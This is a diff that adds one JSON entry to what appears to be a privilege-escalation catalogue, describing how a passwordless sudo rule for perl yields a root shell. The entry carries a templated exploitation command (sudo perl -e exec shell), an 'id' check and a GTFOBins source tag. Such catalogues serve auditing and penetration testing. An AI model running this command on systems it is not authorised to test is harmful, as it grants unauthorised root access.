@@ -1,0 +1,1 @@
+{"id":"sudo_perl","category":"SUDO_NOPASSWD_CUSTOM","binary":"perl","cve":null,"exploitation":["sudo {{binary}} -e 'exec \"{{shell}}\";'"],"post_exploit":["id"],"source":"gtfobins.github.io","tags":["sudo","nopasswd","gtfobins"],"severity":"high"}
